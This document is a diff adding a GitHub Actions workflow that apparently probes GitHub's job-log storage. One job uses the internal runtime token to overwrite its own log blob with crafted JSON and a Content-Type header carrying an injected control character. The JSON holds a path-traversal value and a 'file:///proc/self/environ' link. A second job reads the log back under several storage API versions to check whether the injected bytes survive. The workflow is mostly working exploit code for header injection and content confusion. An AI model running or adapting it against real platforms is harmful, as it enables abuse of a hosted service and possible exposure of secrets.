@@ -1,0 +1,97 @@
+name: Probe raw headers from job log SAS
+on:
+  workflow_dispatch:
+permissions:
+  actions: read
+  contents: read
+jobs:
+  carrier:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Upload JSON and set NEL content type on this job log blob
+        uses: actions/github-script@v8
+        env:
+          GH_TOKEN: ${{ github.token }}
+        with:
+          github-token: ${{ github.token }}
+          script: |
+            const repo = process.env.GITHUB_REPOSITORY;
+            const runId = Number(process.env.GITHUB_RUN_ID);
+            const runtime = process.env.ACTIONS_RUNTIME_TOKEN;
+            const results = process.env.ACTIONS_RESULTS_URL;
+            const claims = JSON.parse(Buffer.from(runtime.split('.')[1], 'base64url').toString());
+            const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
+            const ids = {workflow_run_backend_id: scope.split(':')[1], workflow_job_run_backend_id: scope.split(':')[2]};
+            const gh = {Authorization: 'Bearer ' + process.env.GH_TOKEN, Accept: 'application/vnd.github+json', 'User-Agent': 'raw-header-probe'};
+            const response = await fetch('https://api.github.com/repos/' + repo + '/actions/runs/' + runId + '/jobs?per_page=100', {headers: gh});
+            if (!response.ok) throw new Error('jobs API ' + response.status);
+            const jobs = (await response.json()).jobs;
+            const job = jobs.find(x => x.name === 'carrier') || jobs[0];
+            if (!job) throw new Error('carrier job ID unavailable');
+            const body = Buffer.from(JSON.stringify({full_name: 'x/../../repos/' + repo + '/actions/jobs/' + job.id + '/logs', owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: 'raw header byte probe', stargazers_count: 7}));
+            const twirp = async (method, data) => {
+              const r = await fetch(new URL('twirp/results.services.receiver.Receiver/' + method, results), {method: 'POST', headers: {Authorization: 'Bearer ' + runtime, 'Content-Type': 'application/json'}, body: JSON.stringify(data)});
+              const text = await r.text();
+              if (!r.ok) throw new Error(method + ' HTTP ' + r.status);
+              return JSON.parse(text);
+            };
+            const signed = await twirp('GetJobLogsSignedBlobURL', ids);
+            const put = await fetch(signed.logs_url, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/json\u0085', 'x-ms-version': '2023-11-03'}, body: body});
+            console.log('PUT=' + put.status + ' SP=' + new URL(signed.logs_url).searchParams.get('sp') + ' BODY=' + body.length);
+            await put.arrayBuffer();
+            const p = new URL(signed.logs_url); p.searchParams.set('comp', 'properties');
+            const props = await fetch(p, {method: 'PUT', headers: {'x-ms-blob-content-type': 'application/json\u0085', 'x-ms-version': '2023-11-03'}, body: new Uint8Array(0)});
+            console.log('PROPERTIES=' + props.status + ' ERROR=' + (props.headers.get('x-ms-error-code') || ''));
+            await props.arrayBuffer();
+  verify:
+    needs: carrier
+    runs-on: ubuntu-latest
+    steps:
+      - name: Read raw HTTP Content-Type bytes from the completed log URL
+        uses: actions/github-script@v8
+        env:
+          GH_TOKEN: ${{ github.token }}
+        with:
+          github-token: ${{ github.token }}
+          script: |
+            const https = require('https');
+            const repo = process.env.GITHUB_REPOSITORY;
+            const runId = Number(process.env.GITHUB_RUN_ID);
+            const gh = {Authorization: 'Bearer ' + process.env.GH_TOKEN, Accept: 'application/vnd.github+json', 'User-Agent': 'raw-header-probe'};
+            const r = await fetch('https://api.github.com/repos/' + repo + '/actions/runs/' + runId + '/jobs?per_page=100', {headers: gh});
+            if (!r.ok) throw new Error('jobs API ' + r.status);
+            const job = (await r.json()).jobs.find(x => x.name === 'carrier');
+            if (!job) throw new Error('carrier job ID missing');
+            const body = Buffer.from(JSON.stringify({full_name: 'x/../../repos/' + repo + '/actions/jobs/' + job.id + '/logs', owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: 'raw header byte probe', stargazers_count: 7}));
+            const api = await fetch('https://api.github.com/repos/' + repo + '/actions/jobs/' + job.id + '/logs', {headers: gh, redirect: 'manual'});
+            const location = api.headers.get('location');
+            if (api.status !== 302 || !location) throw new Error('log API ' + api.status);
+            function get(url) {
+              return new Promise((resolve, reject) => {
+                const req = https.get(url, response => {
+                  const chunks = [];
+                  response.on('data', chunk => chunks.push(chunk));
+                  response.on('end', () => resolve({status: response.statusCode, rawHeaders: response.rawHeaders, body: Buffer.concat(chunks)}));
+                });
+                req.on('error', reject);
+                req.setTimeout(15000, () => req.destroy(new Error('timeout')));
+              });
+            }
+            function headerBytes(raw, name) {
+              for (let i = 0; i < raw.length; i += 2) if (raw[i].toLowerCase() === name.toLowerCase()) return Buffer.from(raw[i + 1], 'latin1');
+              return Buffer.alloc(0);
+            }
+            const cases = [
+              ['BASE', null],
+              ['API_2012', '2012-02-12'],
+              ['API_2013', '2013-08-15'],
+              ['API_2015', '2015-12-11'],
+              ['API_2023', '2023-11-03']
+            ];
+            for (const [label, version] of cases) {
+              const u = new URL(location);
+              if (version) u.searchParams.set('api-version', version);
+              const res = await get(u);
+              const type = headerBytes(res.rawHeaders, 'content-type');
+              console.log(label + ' STATUS=' + res.status + ' TYPE_HEX=' + type.toString('hex') + ' TYPE_UTF8=' + JSON.stringify(type.toString('utf8')) + ' EXACT=' + res.body.equals(body) + ' N=' + res.body.length);
+            }
